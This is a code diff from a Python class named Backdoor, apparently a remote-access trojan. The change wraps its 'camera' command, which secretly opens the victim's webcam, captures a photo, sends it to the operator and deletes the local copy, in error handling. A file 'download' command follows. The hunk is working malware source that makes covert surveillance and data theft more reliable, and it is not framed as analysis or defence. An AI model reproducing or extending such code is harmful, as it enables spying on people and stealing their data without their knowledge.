@@ -90,12 +90,15 @@ class Backdoor:
 					self.reliable_send(res)
 
 				elif command == "camera":
-					cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
-					result, image = cam.read()
-					cv2.imwrite("camera.jpg", image)
-					self.reliable_send(self.read_file("camera.jpg") )
-					os.remove("camera.jpg")       
-					cam.release()
+					try:
+						cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+						result, image = cam.read()
+						cv2.imwrite("camera.jpg", image)
+						self.reliable_send(self.read_file("camera.jpg") )
+						os.remove("camera.jpg")       
+						cam.release()
+					except: 
+						self.reliable_send("[-] Can't connect to any camera")
 
 				elif command.split()[0] == "download":
 					file = command.replace("download", "").strip()
